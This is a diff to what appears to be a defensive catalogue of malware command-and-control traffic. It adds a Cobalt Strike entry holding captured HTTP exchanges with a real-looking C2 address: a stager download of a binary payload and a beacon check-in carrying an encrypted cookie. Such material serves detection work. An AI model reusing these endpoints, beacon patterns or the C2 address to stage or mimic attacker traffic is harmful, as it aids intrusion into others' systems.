@@ -145,6 +145,38 @@ BlackRAT.Data.....data.bytes.............16310D190E2C4918020E52	..........$...MZ
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/blackrat.png "Blackrat")
 
+#### Cobaltstrike
+~~~
+GET /Mdt7 HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; NP06)
+Host: 198.199.89.56
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Wed, 16 Oct 2019 00:03:32 GMT
+Content-Type: application/octet-stream
+Content-Length: 213589
+
+.......
+w.z....=..........C.D.'.'Z.2....:1....R..1...1.......1.9.t...^.......3.Q.3.R.~...~..........6a..6a-L^.............................................`.....W...?...O...=...^...1...T...:.......:..._...U...U...U.v.......v......,9
+.W.E.3k..a....9..l.T..k...........J......;J.._.k...$......J....h...'..qD
+
+GET /push HTTP/1.1
+Accept: */*
+Cookie: TwJl1o2Nzk3+xmC39FsNTbyJPGHyNxllFZ8wZUwR831SYmTwrxoGydXQGF1ej89K1t0rTLgzjd95c8127hlZ6SQ4hx95YrYuRHooitXYGEAxtbKv53LJ6K+6r1y1OQU3n0+O93xxPiyx6RvPeKzlACbO4nEc5YKzh0vAfWJvlm0=
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)
+Host: 198.199.89.56
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 200 OK
+Date: Wed, 16 Oct 2019 00:05:35 GMT
+Content-Type: application/octet-stream
+Content-Length: 0
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobaltstrike.png "Cobaltstrike")
+
 #### Danabot
 Not real TLS traffic, flag on "24 01 00 00" pattern and 24 byte first packet 
 ~~~
